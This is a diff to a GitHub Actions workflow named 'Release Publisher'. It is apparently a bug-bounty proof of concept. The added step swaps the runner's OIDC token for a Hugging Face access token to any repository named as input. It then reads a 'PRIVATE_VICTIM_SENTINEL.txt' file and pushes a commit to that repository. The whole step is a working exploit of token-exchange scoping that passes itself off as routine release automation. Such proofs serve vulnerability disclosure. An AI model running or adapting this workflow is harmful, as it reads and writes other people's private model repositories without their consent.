@@ -1,12 +1,40 @@
-name: Selected Protected Workflow
+name: Release Publisher
 on:
   workflow_dispatch:
+    inputs:
+      model:
+        description: Model repository to publish
+        required: true
+        type: string
 permissions:
   contents: read
   id-token: write
 jobs:
-  selected:
+  publish:
     environment: protected-selected
     runs-on: ubuntu-latest
     steps:
-      - run: echo selected-protected-workflow
+      - name: Publish model release
+        env:
+          MODEL: ${{ inputs.model }}
+        run: |
+          set -euo pipefail
+          oidc_response="$(curl -fsS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fhuggingface.co")"
+          OIDC_TOKEN="$(jq -er .value <<<"$oidc_response")"
+          echo "::add-mask::$OIDC_TOKEN"
+          payload="$(jq -cn --arg s "$OIDC_TOKEN" --arg r "$MODEL" '{grant_type:"urn:ietf:params:oauth:grant-type:token-exchange",subject_token_type:"urn:ietf:params:oauth:token-type:id_token",subject_token:$s,resource:$r}')"
+          status="$(curl -sS -o /tmp/exchange.json -w '%{http_code}' -X POST https://huggingface.co/oauth/token -H 'Content-Type: application/json' --data "$payload")"
+          echo "HF_EXCHANGE_STATUS=$status"
+          if [ "$status" != "200" ]; then cat /tmp/exchange.json; exit 1; fi
+          HF_TOKEN="$(jq -er .access_token /tmp/exchange.json)"
+          echo "::add-mask::$HF_TOKEN"
+          file="/tmp/release_input"
+          curl -fsS "https://huggingface.co/${MODEL}/resolve/main/PRIVATE_VICTIM_SENTINEL.txt" -H "Authorization: Bearer $HF_TOKEN" -o "$file"
+          digest="$(sha256sum "$file" | awk '{print $1}')"
+          echo "HF_PRIVATE_READ_SHA256=$digest"
+          rm -f "$file"
+          notes="$(jq -cn --arg d "$digest" '{key:"header",value:{summary:"Release note verification",description:"Owned H1 release canary"}}')"
+          body="$(jq -cn --arg c "$(printf 'release verified %s\n' "$digest" | base64 -w0)" '{key:"file",value:{content:$c,path:"RELEASE_NOTES.txt",encoding:"base64"}}')"
+          printf '%s\n%s\n' "$notes" "$body" > /tmp/notes.ndjson
+          resp="$(curl -fsS -X POST "https://huggingface.co/api/models/${MODEL}/commit/main" -H "Authorization: Bearer $HF_TOKEN" -H 'Content-Type: application/x-ndjson' --data-binary @/tmp/notes.ndjson)"
+          jq -c '{success,commitOid}' <<<"$resp" | sed 's/^/HF_COMMIT=/'
